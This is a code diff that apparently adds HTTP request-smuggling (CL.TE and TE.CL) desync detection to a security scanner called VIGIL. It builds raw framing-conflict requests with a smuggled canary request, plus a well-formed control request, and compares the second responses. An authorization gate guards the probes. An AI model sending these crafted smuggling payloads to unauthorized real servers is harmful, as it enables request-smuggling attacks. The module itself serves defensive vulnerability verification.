@@ -330,6 +330,314 @@ def detect(
 
 
 # ---------------------------------------------------------------------------
+# The ACHIEVED-DESYNC differential — the timing-free proof (CWE-444, Wave-4.2)
+# ---------------------------------------------------------------------------
+#
+# Everything above this line is TIMING, and timing is a LEAD: a normal origin that
+# merely honours RFC 7230 §3.3.3 (Transfer-Encoding wins over Content-Length) hangs
+# waiting for a chunk that never comes, exactly like a desynced one. Audit A12 (#269)
+# capped that signal at an UNCONFIRMED Low, and `detect()` above reports it that way.
+#
+# What follows is the signal a benign origin CANNOT produce: VIGIL opens ONE connection
+# it owns and sends TWO requests. The FIRST carries a framing conflict whose smuggled
+# tail is a request to a reflect surface embedding a UNIQUE, high-entropy per-probe
+# canary; the SECOND is VIGIL's OWN ordinary follow-up, carrying NO canary. On a SECOND
+# VIGIL-owned connection it sends the SAME bytes WELL-FORMED (no conflict) plus the SAME
+# follow-up, so the framing conflict is the ONLY variable. If the back-end desynced, the
+# leftover smuggled prefix is prepended to VIGIL's own second request and its response
+# ECHOES the canary; on the control leg it does not. `verify.oracles.
+# smuggling_desync_oracle` re-derives that differential from the RETAINED RAW second
+# responses at every re-verification — no latency is consulted.
+#
+# NO victim is poisoned: both requests on both connections are VIGIL's own, on VIGIL's
+# own sockets, so the "poisoned next request" is VIGIL's own.
+
+
+class DesyncLeg(BaseModel):
+    """One leg's RAW second-request response — the bytes the oracle adjudicates."""
+
+    model_config = ConfigDict(extra="forbid")
+
+    channel: bool = Field(default=False, description="A complete response was read for the SECOND request.")
+    status: int | None = None
+    reason: str = ""
+    body: str = ""
+
+
+class DesyncProbe(BaseModel):
+    """One (technique, canary) achieved-desync capture: both legs' raw second responses.
+
+    Carries NO verdict — the deterministic ``smuggling_desync_oracle`` renders it over
+    ``conflict``/``control``. ``note`` explains a leg that established no channel (an
+    honest INCONCLUSIVE, never a CLEAN and never a fabricated leak)."""
+
+    model_config = ConfigDict(extra="forbid")
+
+    technique: str
+    canary: str
+    conflict: DesyncLeg = Field(default_factory=DesyncLeg)
+    control: DesyncLeg = Field(default_factory=DesyncLeg)
+    note: str = ""
+
+    @property
+    def adjudicable(self) -> bool:
+        """Both VIGIL-owned second requests read a response, so the differential exists."""
+        return self.conflict.channel and self.control.channel
+
+
+# The framing conflicts driven over the connection VIGIL owns. Kept to the two base
+# classes: an obfuscation variant changes only which parser is fooled, and each extra
+# technique costs two more connections against the operator's origin.
+DESYNC_TECHNIQUES: tuple[str, ...] = ("CL.TE", "TE.CL")
+
+_DESYNC_MAX_RAW = 65536   # bounded read — the differential needs only the first two responses
+
+
+def _smuggled_prefix(host: str, canary: str) -> str:
+    """The smuggled request embedded in the conflict leg's first request: a GET to a
+    reflect surface carrying the UNIQUE per-probe canary. If the back-end desyncs, this
+    is served as VIGIL's OWN second response on the socket, echoing the canary.
+
+    The ``/vigil-*`` path shapes are deliberately the SAME ones the gated live re-drive
+    (``vigil_integration.live.smuggling_redrive``) uses, so ONE set of fixtures
+    (``eval.benchmark_app.serve_smuggling_{desync,benign,reflect_error}``) exercises both
+    producers: the positive, the safe twin and the echo-the-request red-pen twin."""
+    return (f"GET /vigil-reflect?c={canary} HTTP/1.1\r\nHost: {host}\r\n"
+            f"X-Vigil-Canary: {canary}\r\nConnection: keep-alive\r\n\r\n")
+
+
+def _desync_follow_up(host: str) -> bytes:
+    """VIGIL's OWN DISTINCT second request, actually sent on the SAME socket after the
+    first response has been fully consumed. It deliberately carries NO canary: if ITS
+    genuine response echoes the per-probe canary, that canary can ONLY have come from the
+    leftover smuggled prefix a desynced back-end prepended to it — never from an endpoint
+    that merely reflects this request's own bytes."""
+    return f"GET /vigil-follow HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode("latin-1")
+
+
+def _desync_conflict_first(technique: str, host: str, canary: str) -> bytes:
+    """The CONFLICT leg's first request: a CL/TE framing conflict whose smuggled tail is
+    :func:`_smuggled_prefix`. ``Connection: keep-alive`` (on BOTH legs, so it is not the
+    variable) keeps the socket open for VIGIL's genuine second request."""
+    smuggled = _smuggled_prefix(host, canary)
+    if technique == "TE.CL":
+        body = f"{len(smuggled):x}\r\n{smuggled}\r\n0\r\n\r\n"
+        return (f"POST /vigil-start HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n"
+                f"Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n{body}").encode("latin-1")
+    body = f"0\r\n\r\n{smuggled}"
+    return (f"POST /vigil-start HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n"
+            f"Content-Length: {len(body)}\r\nTransfer-Encoding: chunked\r\n\r\n{body}").encode("latin-1")
+
+
+def _desync_control_first(host: str, canary: str) -> bytes:
+    """The CONTROL leg's first request: the SAME reflect surface + the SAME canary, but
+    WELL-FORMED (one honest Content-Length, no Transfer-Encoding), so no leftover prefix
+    exists. The only variable vs the conflict leg is the framing conflict itself."""
+    body = _smuggled_prefix(host, canary)
+    return (f"POST /vigil-start HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n"
+            f"Content-Length: {len(body)}\r\n\r\n{body}").encode("latin-1")
+
+
+class _RawResponseReader:
+    """Reads DISCRETE HTTP responses off a raw socket, EACH BY ITS OWN FRAMING (chunked /
+    Content-Length / connection-close), buffering surplus bytes so a pipelined or
+    desync-leftover response is returned by the NEXT ``read_response()`` — never a lexical
+    split of one accumulated blob on ``HTTP/1.``.
+
+    That is what makes the second-request differential real: after the first request the
+    reader consumes EXACTLY the first response and no more, so a benign server that echoes
+    the first request (canary and all) in a 400/405 body cannot fool it — that echo lives
+    in the FIRST response and is never conflated with the second."""
+
+    def __init__(self, sock: socket.socket, *, budget: int = _DESYNC_MAX_RAW) -> None:
+        self._sock = sock
+        self._buf = bytearray()
+        self._closed = False
+        self._budget = budget
+
+    def _recv(self) -> bool:
+        if self._closed or self._budget <= 0:
+            return False
+        try:
+            chunk = self._sock.recv(min(4096, self._budget))
+        except socket.timeout:
+            return False
+        except OSError:
+            self._closed = True
+            return False
+        if not chunk:
+            self._closed = True
+            return False
+        self._buf.extend(chunk)
+        self._budget -= len(chunk)
+        return True
+
+    def _need(self, n: int) -> bool:
+        while len(self._buf) < n:
+            if not self._recv():
+                return False
+        return True
+
+    def _need_marker(self, marker: bytes) -> bool:
+        while marker not in self._buf:
+            if not self._recv():
+                return False
+        return True
+
+    @property
+    def exhausted(self) -> bool:
+        """The peer closed AND nothing is buffered — driving a second request is pointless."""
+        return self._closed and not self._buf
+
+    def _read_chunked(self) -> bytes:
+        out = bytearray()
+        while True:
+            if not self._need_marker(b"\r\n"):
+                break
+            line = bytes(self._buf).split(b"\r\n", 1)[0]
+            del self._buf[: len(line) + 2]
+            try:
+                size = int(line.split(b";", 1)[0].strip(), 16)
+            except ValueError:
+                break
+            if size == 0:
+                if self._need(2):
+                    del self._buf[:2]
+                break
+            if not self._need(size + 2):
+                out.extend(self._buf)
+                self._buf.clear()
+                break
+            out.extend(self._buf[:size])
+            del self._buf[: size + 2]
+        return bytes(out)
+
+    def _read_body(self, headers: "dict[str, str]", status: "int | None") -> bytes:
+        if "chunked" in headers.get("transfer-encoding", "").lower():
+            return self._read_chunked()
+        cl = headers.get("content-length")
+        if cl is not None and cl.strip().isdigit():
+            n = int(cl.strip())
+            self._need(n)
+            body = bytes(self._buf[:n])
+            del self._buf[:n]
+            return body
+        # No length framing: a bodyless status has no body; otherwise the body runs to
+        # connection close, so draining it necessarily closes the socket (the caller then
+        # sees ``exhausted`` and records the second leg as no-channel).
+        if status in (204, 304) or (status is not None and 100 <= status < 200):
+            return b""
+        while self._recv():
+            pass
+        body = bytes(self._buf)
+        self._buf.clear()
+        self._closed = True
+        return body
+
+    def read_response(self) -> DesyncLeg:
+        """Read exactly ONE HTTP response. ``channel`` is False when no complete response
+        could be read (peer silent/closed with no header block)."""
+        if not self._need_marker(b"\r\n\r\n"):
+            return DesyncLeg()
+        head = bytes(self._buf).split(b"\r\n\r\n", 1)[0]
+        del self._buf[: len(head) + 4]
+        lines = head.split(b"\r\n")
+        status: "int | None" = None
+        reason = ""
+        bits = lines[0].decode("latin-1", "replace").split(" ", 2)
+        if len(bits) >= 2 and bits[1].isdigit():
+            status = int(bits[1])
+            reason = bits[2] if len(bits) > 2 else ""
+        headers: dict[str, str] = {}
+        for ln in lines[1:]:
+            i = ln.find(b":")
+            if i > 0:
+                headers[ln[:i].strip().lower().decode("latin-1", "replace")] = \
+                    ln[i + 1:].strip().decode("latin-1", "replace")
+        body = self._read_body(headers, status)
+        return DesyncLeg(channel=True, status=status, reason=reason,
+                         body=body.decode("latin-1", "replace"))
+
+
+def _desync_leg(host: str, port: int, first: bytes, follow_up: bytes,
+                *, timeout: float) -> tuple[DesyncLeg, str]:
+    """Drive ONE fresh socket: send ``first``, CONSUME EXACTLY its first response by that
+    response's own framing, then ACTUALLY SEND ``follow_up`` on the SAME socket and read
+    ITS genuine response. Returns (second response, note). A connection that does not
+    persist past the first response yields ``channel=False`` — an honest INCONCLUSIVE."""
+    try:
+        s = socket.create_connection((host, port), timeout=timeout)
+    except OSError as exc:
+        return DesyncLeg(), f"connect error (no channel): {type(exc).__name__}"
+    try:
+        s.settimeout(timeout)
+        reader = _RawResponseReader(s)
+        s.sendall(first)
+        if not reader.read_response().channel:
+            return DesyncLeg(), "no first response observed (no channel to drive the second request)"
+        if reader.exhausted:
+            return DesyncLeg(), "connection did not persist after the first response — no second request driven"
+        s.sendall(follow_up)
+        return reader.read_response(), ""
+    except OSError as exc:
+        return DesyncLeg(), f"transport error: {type(exc).__name__}"
+    finally:
+        try:
+            s.close()
+        except OSError:
+            pass
+
+
+def detect_desync(
+    host: str,
+    port: int,
+    *,
+    techniques: "tuple[str, ...]" = DESYNC_TECHNIQUES,
+    timeout: float = 6.0,
+    authorize: "Callable[[str], bool] | None" = None,
+    canary: "Callable[[], str] | None" = None,
+) -> list[DesyncProbe]:
+    """Capture the ACHIEVED-DESYNC differential for each technique — the timing-free
+    evidence ``verify.oracles.smuggling_desync_oracle`` adjudicates.
+
+    Returns one :class:`DesyncProbe` per technique carrying BOTH legs' RAW second-request
+    responses. It renders NO verdict of its own: the oracle decides, over the retained
+    bytes, so the resulting certificate re-verifies offline. ``authorize`` (when given) is
+    re-checked before EVERY probe and a falsy/raising gate means no byte leaves the box.
+    ``canary`` is injectable for tests; the default mints a fresh high-entropy token per
+    probe from ``secrets`` (never the global RNG, which a determinism test seeds)."""
+    import secrets
+
+    def _mint() -> str:
+        return "crsmug" + secrets.token_hex(13)   # unique, high-entropy, >= 12 alnum chars
+
+    mint = canary or _mint
+    origin_url = f"http://{host}:{port}/"
+    follow_up = _desync_follow_up(host)
+    probes: list[DesyncProbe] = []
+    for technique in techniques:
+        if authorize is not None:
+            try:
+                if not authorize(origin_url):
+                    continue
+            except Exception:       # a gate that raises fails CLOSED
+                continue
+        token = mint()
+        conflict, why_c = _desync_leg(
+            host, port, _desync_conflict_first(technique, host, token), follow_up, timeout=timeout)
+        if not conflict.channel:
+            probes.append(DesyncProbe(technique=technique, canary=token,
+                                      note=f"conflict leg: {why_c}"))
+            continue
+        control, why_k = _desync_leg(
+            host, port, _desync_control_first(host, token), follow_up, timeout=timeout)
+        probes.append(DesyncProbe(technique=technique, canary=token, conflict=conflict,
+                                  control=control,
+                                  note=("" if control.channel else f"control leg: {why_k}")))
+    return probes
+
+
+# ---------------------------------------------------------------------------
 # HTTP/2 — honest capability detection, NOT h2 smuggling exploitation
 # ---------------------------------------------------------------------------
 
